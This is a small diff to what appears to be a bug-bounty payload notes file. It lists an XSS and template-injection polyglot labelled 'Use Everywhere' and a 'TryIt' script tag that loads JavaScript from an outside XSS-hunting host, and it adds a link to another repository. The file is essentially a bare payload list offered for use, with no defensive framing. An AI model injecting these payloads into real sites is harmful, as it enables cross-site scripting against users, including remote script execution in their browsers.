@@ -21,7 +21,12 @@ https://github.com/yogsec/endpoints-extractor/tree/main
 
 Use Everywhere: '"><svg/onload=prompt(7);>{{7*7}}
 
+
+
 TryIt: <script src="https://xss0r.com/Resources/xss0r.js"></script>
+https://github.com/orlyjamie/spinningcat
+
+
 
 Inject Payload:
 ---------------
